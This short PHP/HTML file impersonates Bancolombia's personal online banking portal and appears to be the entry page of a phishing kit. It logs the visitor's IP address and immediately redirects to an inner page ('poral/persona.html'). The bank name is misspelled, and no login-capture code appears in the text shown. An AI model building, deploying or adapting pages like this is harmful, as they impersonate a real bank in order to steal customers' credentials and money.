<?php
$ip = getenv("REMOTE_ADDR");
setlocale(LC_TIME, "spanish");
$tiempo = strftime("%A, %d de %B de %Y");
date_default_timezone_set('America/Bogota');
?>
<html>
	<head>
  		<title>Bancolombia Sucursal Vrtual Personas</title>
  		<meta http-equiv="content-type" content="text/html; utf-8">
  		<meta charset="utf-8">
  		
		<meta content="es" http-equiv="Content-Language">
  	
		<meta name="description" content="">
  		<meta name="author" content="">
  		<meta name="Copyright" content="">
  		<meta name="viewport" content="width=device-width, initial-scale=1.0">
	 	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	 	<script src="https://kit.fontawesome.com/45b9078c9f.js" crossorigin="anonymous"></script>
		<link href="poral/css/style.css" rel="stylesheet">
		<link href="poral/css/stylesheet.css" rel="stylesheet">		
		<link rel="icon" type="image/png" href="poral/img/logo.png" />
		<script type="text/javascript" src="../../js/jquery-3.6.0.min.js"></script>
		<script src="../../js/jquery.jclock-min.js" type="text/javascript"></script>
   	</head>
   	<body>
   		<script type="text/javascript">
            $(document).ready(function() {
                window.location.href = "poral/persona.html"; 
            });
       </script>
   	</body>
</html>